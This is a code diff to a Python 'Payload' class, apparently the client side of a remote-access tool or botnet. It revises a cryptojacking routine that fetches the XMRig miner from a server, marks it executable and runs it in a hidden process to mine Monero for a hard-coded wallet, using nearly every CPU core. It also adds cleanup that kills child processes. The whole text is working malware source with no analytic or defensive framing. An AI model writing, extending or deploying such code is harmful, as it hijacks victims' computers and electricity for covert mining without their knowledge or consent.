@@ -108,6 +108,7 @@ class Payload():
         self.key = self._get_key(self.connection)
         self.info = self._get_info()
         self.xmrig_path = None
+        self.xmrig_path_dev = None
 
 
     def _get_flags(self):
@@ -255,8 +256,8 @@ class Payload():
         username = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
 
         # check cpu count to set number of threads
-        import multiprocessing as mp
-        threads = mp.cpu_count() - 1
+        import multiprocessing
+        threads = multiprocessing.cpu_count() - 1
 
         # pull xmrig from server if necessary
         if not self.xmrig_path_dev:
@@ -270,7 +271,7 @@ class Payload():
             os.chmod(self.xmrig_path_dev, 755)
 
         # excute xmrig in hidden process
-        params = self.xmrig_path_dev + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, username=username, host=globals()['public_ip'](), port=port, threads=threads)
+        params = self.xmrig_path_dev + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, username=username, threads=threads)
         result = self.execute(params)
         return result
 
@@ -397,11 +398,19 @@ class Payload():
             self.flags.passive.clear()
             self.flags.prompt.clear()
             self.connection.close()
+
+            # stop threads
             for thread in list(self.handlers):
                 try:
                     self.stop(thread)
                 except Exception as e:
                     log("{} error: {}".format(self.kill.__name__, str(e)))
+
+            # kill child processes
+            for proc in self.execute.process_list.values():
+                try:
+                    proc.kill()
+                except: pass     
         except Exception as e:
             log("{} error: {}".format(self.kill.__name__, str(e)))
 
